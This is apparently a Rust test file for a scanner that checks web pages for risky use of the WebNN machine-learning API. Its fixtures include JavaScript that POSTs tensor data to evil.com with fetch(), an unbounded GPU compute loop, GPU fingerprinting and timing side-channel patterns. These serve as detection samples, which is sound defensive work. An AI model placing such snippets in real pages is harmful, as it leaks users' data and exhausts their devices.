use crate::webnn_audit::*;

#[test]
fn empty_body_returns_nothing() {
    assert!(analyze_webnn("").is_empty());
}

#[test]
fn no_webnn_returns_nothing() {
    assert!(analyze_webnn("<html><body>Hello world</body></html>").is_empty());
}

#[test]
fn detects_navigator_ml() {
    let body = "<script>const ctx = await navigator.ml.createContext();</script>";
    let issues = analyze_webnn(body);
    assert!(issues.contains(&WebnnIssue::ApiDetected));
}

#[test]
fn detects_ml_graph_builder() {
    let body = "<script>const builder = new MLGraphBuilder(context);</script>";
    let issues = analyze_webnn(body);
    assert!(issues.contains(&WebnnIssue::ApiDetected));
}

#[test]
fn detects_ml_context() {
    let body = "<script>const ctx = new MLContext({deviceType: 'gpu'});</script>";
    let issues = analyze_webnn(body);
    assert!(issues.contains(&WebnnIssue::ApiDetected));
}

#[test]
fn detects_model_exfiltration() {
    let body = "<script>
        const ctx = await navigator.ml.createContext();
        const result = await graph.compute();
        const buf = result.arrayBuffer();
        fetch('https://evil.com/collect', {method: 'POST', body: buf});
    </script>";
    let issues = analyze_webnn(body);
    assert!(issues.contains(&WebnnIssue::ModelExfiltration));
}

#[test]
fn no_model_exfiltration_without_tensor() {
    let body = "<script>
        const ctx = await navigator.ml.createContext();
        fetch('https://api.example.com/data');
    </script>";
    let issues = analyze_webnn(body);
    assert!(!issues.contains(&WebnnIssue::ModelExfiltration));
}

#[test]
fn detects_resource_exhaustion() {
    let body = "<script>
        const builder = new MLGraphBuilder(context);
        while (true) { builder.relu(input); }
    </script>";
    let issues = analyze_webnn(body);
    assert!(issues.contains(&WebnnIssue::ResourceExhaustion));
}

#[test]
fn no_resource_exhaustion_with_break() {
    let body = "<script>
        const builder = new MLGraphBuilder(context);
        while (running) { if (done) break; builder.relu(input); }
    </script>";
    let issues = analyze_webnn(body);
    assert!(!issues.contains(&WebnnIssue::ResourceExhaustion));
}

#[test]
fn no_resource_exhaustion_with_limit() {
    let body = "<script>
        const builder = new MLGraphBuilder(context);
        for (let i = 0; i < limit; i++) { builder.relu(input); }
    </script>";
    let issues = analyze_webnn(body);
    assert!(!issues.contains(&WebnnIssue::ResourceExhaustion));
}

#[test]
fn detects_gpu_fingerprinting() {
    let body = "<script>
        const ctx = new MLContext({deviceType: 'gpu', powerPreference: 'high-performance'});
    </script>";
    let issues = analyze_webnn(body);
    assert!(issues.contains(&WebnnIssue::GpuFingerprinting));
}

#[test]
fn detects_side_channel_timing() {
    let body = "<script>
        const builder = new MLGraphBuilder(context);
        const start = performance.now();
        await graph.compute(inputs, outputs);
        const elapsed = performance.now() - start;
    </script>";
    let issues = analyze_webnn(body);
    assert!(issues.contains(&WebnnIssue::SideChannelTiming));
}

#[test]
fn no_timing_without_compute() {
    let body = "<script>
        const builder = new MLGraphBuilder(context);
        const start = performance.now();
        doSomething();
    </script>";
    let issues = analyze_webnn(body);
    assert!(!issues.contains(&WebnnIssue::SideChannelTiming));
}

#[test]
fn all_issues_detected() {
    let body = "<script>
        const ctx = new MLContext({deviceType: 'gpu', numThreads: 4});
        const builder = new MLGraphBuilder(ctx);
        const start = performance.now();
        while (true) { await graph.compute(inputs, outputs); }
        const buf = result.arrayBuffer();
        fetch('https://evil.com', {body: buf});
        const end = performance.now() - start;
        await graph.dispatch(cmd);
    </script>";
    let issues = analyze_webnn(body);
    assert_eq!(issues.len(), 5);
    assert!(issues.contains(&WebnnIssue::ApiDetected));
    assert!(issues.contains(&WebnnIssue::ModelExfiltration));
    assert!(issues.contains(&WebnnIssue::ResourceExhaustion));
    assert!(issues.contains(&WebnnIssue::GpuFingerprinting));
    assert!(issues.contains(&WebnnIssue::SideChannelTiming));
}

#[test]
fn severity_values_correct() {
    assert_eq!(webnn_severity(&WebnnIssue::ModelExfiltration), 7.5);
    assert_eq!(webnn_severity(&WebnnIssue::ResourceExhaustion), 7.0);
    assert_eq!(webnn_severity(&WebnnIssue::GpuFingerprinting), 6.5);
    assert_eq!(webnn_severity(&WebnnIssue::SideChannelTiming), 6.0);
    assert_eq!(webnn_severity(&WebnnIssue::ApiDetected), 2.0);
}

#[test]
fn display_impl_works() {
    assert_eq!(WebnnIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(
        WebnnIssue::ModelExfiltration.to_string(),
        "model_exfiltration"
    );
    assert_eq!(
        WebnnIssue::GpuFingerprinting.to_string(),
        "gpu_fingerprinting"
    );
}

#[test]
fn operations_generated_correctly() {
    let issues = vec![WebnnIssue::ApiDetected, WebnnIssue::ModelExfiltration];
    let mut seq = 0;
    let ops = webnn_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn operations_increment_sequence() {
    let issues = vec![
        WebnnIssue::ApiDetected,
        WebnnIssue::ResourceExhaustion,
        WebnnIssue::SideChannelTiming,
    ];
    let mut seq = 10;
    let ops = webnn_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 13);
}
